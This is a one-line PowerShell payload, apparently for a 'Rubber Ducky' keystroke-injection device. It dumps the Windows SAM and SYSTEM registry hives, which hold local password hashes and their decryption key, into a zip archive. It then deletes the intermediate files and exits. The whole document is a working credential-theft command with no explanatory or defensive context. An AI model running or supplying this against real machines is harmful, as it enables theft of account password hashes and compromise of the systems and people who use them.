reg save hklm\sam DuckySam;reg save hklm\system DuckySys;Compress-Archive -Path "$PWD\DuckySys", "$PWD\DuckySam" -DestinationPath SamDumpDucky.zip;remove-item DuckySys;remove-item DuckySam;exit
